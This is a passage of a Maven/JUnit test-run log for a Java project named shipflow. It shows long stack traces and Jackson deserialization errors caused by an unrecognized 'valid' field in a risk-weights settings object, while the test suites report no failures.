	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.013 s -- in com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$ResetToDefaultsTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$UpdateSettingsTests
2026-01-17T23:26:52.543Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by specific-admin
2026-01-17T23:26:52.544Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.546Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.548Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.550Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.552Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.554Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:52.555Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.updateSettings(OrganizationSettingsService.java:106) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$UpdateSettingsTests.shouldCreateDefaultSettingsIfNoneExistWhenUpdating(OrganizationSettingsServiceTest.java:356) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:52.557Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.016 s -- in com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$UpdateSettingsTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$GetSettingsTests
2026-01-17T23:26:52.563Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.getSettings(OrganizationSettingsService.java:39) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$GetSettingsTests.shouldCreateDefaultSettingsWhenNoneExist(OrganizationSettingsServiceTest.java:118) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
